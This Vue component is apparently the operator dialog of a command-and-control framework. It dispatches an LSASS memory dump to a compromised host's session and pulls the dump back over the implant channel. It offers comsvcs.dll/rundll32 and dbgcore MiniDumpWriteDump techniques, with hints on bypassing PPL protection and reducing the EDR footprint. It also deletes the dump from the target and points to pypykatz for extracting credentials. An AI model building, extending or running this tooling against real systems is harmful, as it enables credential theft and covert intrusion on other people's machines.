<template>
  <el-dialog
    v-model="visible"
    :title="isZh ? '凭据获取（内存转储）' : 'Credential Access (Memory Dump)'"
    width="560px"
    :close-on-click-modal="false"
    append-to-body
    class="cs-dialog"
  >
    <div class="cs-dialog-body cs-font-ui">
      <div class="cs-dialog-desc">
        <span v-if="isZh">
          从目标机 <b>lsass.exe</b> 获取内存转储并经加密通道回传。服务端只负责校验与归档，
          <b>不做凭据解析</b>——制品落地后用本地工具解析：
          <code class="cs-font-mono">pypykatz lsa minidump &lt;文件&gt;</code>。
          制品在回传完成后会从目标磁盘删除。
        </span>
        <span v-else>
          Dumps <b>lsass.exe</b> memory on the target and transfers it back over the encrypted channel.
          The server only verifies and stores the artifact — <b>no parsing</b>. Parse locally with
          <code class="cs-font-mono">pypykatz lsa minidump &lt;file&gt;</code>. The dump is deleted from the target after transfer.
        </span>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '目标会话:' : 'Session:' }}</label>
        <span class="cs-form-static cs-font-mono">{{ uid ? uid.slice(0, 8) : '-' }}</span>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '获取技术:' : 'Technique:' }}</label>
        <el-select v-model="form.tech" size="small" class="cs-form-input">
          <el-option :label="isZh ? 'auto（先签名进程路径，失败回退）' : 'auto (signed-process first, fallback)'" value="auto" />
          <el-option label="comsvcs.dll (rundll32)" value="comsvcs" />
          <el-option label="dbgcore.dll (MiniDumpWriteDump)" value="dbgcore" />
        </el-select>
      </div>

      <div class="cd-tech-hint">
        <template v-if="form.tech === 'comsvcs'">
          {{ isZh
            ? '借签名进程 rundll32 调用 comsvcs.dll!MiniDump：对受 PPL 保护的 LSASS 同样有效，但会拉起子进程并落盘，行为链较长、EDR 覆盖好。'
            : 'Signed process (rundll32) calls comsvcs.dll!MiniDump: works against PPL-protected LSASS, but spawns a child process and writes to disk — a long behavior chain.' }}
        </template>
        <template v-else-if="form.tech === 'dbgcore'">
          {{ isZh
            ? '在植入体进程内调用签名库 dbgcore.dll!MiniDumpWriteDump：不留子进程、行为链短；但 PPL 开启时会因调用方未签名被拒（返回 ACCESS_DENIED）。'
            : 'In-process call to the signed dbgcore.dll!MiniDumpWriteDump: no child process, short chain; rejected when PPL is on (ACCESS_DENIED).' }}
        </template>
        <template v-else>
          {{ isZh
            ? '先走 comsvcs（成功率高），失败后自动回退 dbgcore（痕迹更小）。'
            : 'Tries comsvcs first (higher success rate), falls back to dbgcore (smaller footprint).' }}
        </template>
      </div>

      <!-- 等待回传 / 已落地制品：让操作员看到"还差什么、已经拿到了什么" -->
      <div class="cd-section-title">{{ isZh ? '等待回传' : 'Awaiting transfer' }}</div>
      <div v-if="!pending.length" class="cd-empty">{{ isZh ? '无' : 'None' }}</div>
      <div v-for="p in pending" :key="p.file_name" class="cd-row">
        <span class="cd-badge cd-badge-wait">{{ isZh ? '等待中' : 'Pending' }}</span>
        <span class="cs-font-mono cd-name">{{ p.file_name }}</span>
        <span class="cd-meta">{{ p.operator }} · #{{ p.task_id }}</span>
      </div>

      <div class="cd-section-title">{{ isZh ? '已获取制品' : 'Artifacts' }}</div>
      <div v-if="!artifacts.length" class="cd-empty">{{ isZh ? '无' : 'None' }}</div>
      <div v-for="a in artifacts" :key="a.id" class="cd-row">
        <span class="cd-badge cd-badge-ok">{{ a.source }}</span>
        <span class="cd-name cd-note" :title="a.note">{{ a.note || a.secret }}</span>
        <a class="row-link" @click="download(a)">{{ isZh ? '取回' : 'Fetch' }}</a>
      </div>
    </div>

    <template #footer>
      <div class="cs-dialog-footer-center">
        <button class="cs-btn cs-btn-primary" :disabled="busy || !uid" @click="handleDump">
          {{ busy ? (isZh ? '下发中...' : 'Dispatching...') : (isZh ? '开始获取' : 'Start') }}
        </button>
        <button class="cs-btn" @click="visible = false">{{ isZh ? '关闭' : 'Close' }}</button>
      </div>
    </template>
  </el-dialog>
</template>

<script setup lang="ts">
import { computed, reactive, ref, watch } from 'vue'
import { ElMessage } from 'element-plus'
import CredAPI, { type CredArtifact, type CredArtifactRequest } from '@/api/cred'
import ClientAPI from '@/api/clients'
import { useI18nStore } from '@/stores/i18n'
import { downloadBlob } from '@/layout/Dialogs/Payloads/payloadUtil'

const props = withDefaults(defineProps<{ modelValue: boolean; uid?: string }>(), { uid: '' })
const emit = defineEmits<{ (e: 'update:modelValue', value: boolean): void }>()
const visible = computed({
  get: () => props.modelValue,
  set: (value) => emit('update:modelValue', value),
})

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const form = reactive({ tech: 'auto' })
const pending = ref<CredArtifactRequest[]>([])
const artifacts = ref<CredArtifact[]>([])
const busy = ref(false)
let pollTimer: number | null = null

async function refresh() {
  if (!props.uid) return
  try {
    const res = await CredAPI.listArtifacts(props.uid)
    const data = res.data?.data
    pending.value = Array.isArray(data?.pending) ? data.pending : []
    artifacts.value = Array.isArray(data?.artifacts) ? data.artifacts : []
  } catch {
    // 拉取失败保留上一次状态
  }
}

function startPolling() {
  stopPolling()
  // 制品要等客户端下次回连才回传（轮询型传输可能数分钟），5s 刷新一次即可
  pollTimer = window.setInterval(() => {
    if (document.visibilityState === 'hidden') return
    refresh()
  }, 5000)
}

function stopPolling() {
  if (pollTimer !== null) {
    window.clearInterval(pollTimer)
    pollTimer = null
  }
}

// immediate：宿主若在挂载时就已经打开（visible 初值为 true），也要立刻拉一次状态
watch(visible, (val) => {
  if (val) {
    refresh()
    startPolling()
  } else {
    stopPolling()
  }
}, { immediate: true })

async function handleDump() {
  if (!props.uid) return
  busy.value = true
  try {
    const res = await CredAPI.dump({ uid: props.uid, kind: 'lsass', tech: form.tech })
    const data = res.data?.data
    ElMessage.success(
      isZh.value
        ? `已下发（任务 #${res.data?.task_id}），等待制品回传：${data?.file_name || ''}`
        : `Dispatched (task #${res.data?.task_id}), awaiting artifact: ${data?.file_name || ''}`,
    )
    await refresh()
  } catch (e: any) {
    ElMessage.error(e?.response?.data?.error || (isZh.value ? '下发失败' : 'Dispatch failed'))
  } finally {
    busy.value = false
  }
}

// 取回制品：制品落在服务端 Downloads 目录，走文件下载接口取到本地解析
async function download(a: CredArtifact) {
  try {
    const res = await ClientAPI.download_downloaded_file({ uid: a.uid, filePath: a.secret })
    const name = a.secret.split(/[\\/]/).pop() || 'artifact.dmp'
    downloadBlob(res.data, name)
    ElMessage.success(isZh.value ? '制品已取回，请用本地工具解析' : 'Artifact fetched; parse it locally')
  } catch {
    ElMessage.error(isZh.value ? '取回失败（制品可能已被清理）' : 'Fetch failed (artifact may be gone)')
  }
}
</script>

<style scoped>
.cs-form-static {
  flex: 1;
  font-size: 13px;
  color: var(--cs-text);
}

.cd-tech-hint {
  margin: 2px 0 10px;
  padding: 6px 10px;
  font-size: 12px;
  line-height: 1.6;
  color: var(--cs-text-dim);
  background: var(--cs-bg);
  border-left: 2px solid var(--cs-active);
  border-radius: 4px;
}

.cd-section-title {
  margin: 10px 0 4px;
  font-size: 12px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.cd-empty {
  font-size: 12px;
  color: var(--cs-text-dim);
  padding: 2px 0;
}

.cd-row {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 3px 0;
  font-size: 12px;
}

.cd-badge {
  flex-shrink: 0;
  padding: 1px 6px;
  border-radius: 3px;
  font-size: 11px;
  color: #fff;
}

.cd-badge-wait { background: var(--cs-warning); }
.cd-badge-ok { background: var(--cs-online); }

.cd-name {
  flex: 1;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.cd-note { color: var(--cs-text); }

.cd-meta { color: var(--cs-text-dim); font-size: 11px; }

.row-link {
  color: var(--cs-active);
  font-size: 12px;
  cursor: pointer;
}

.row-link:hover { text-decoration: underline; }
</style>
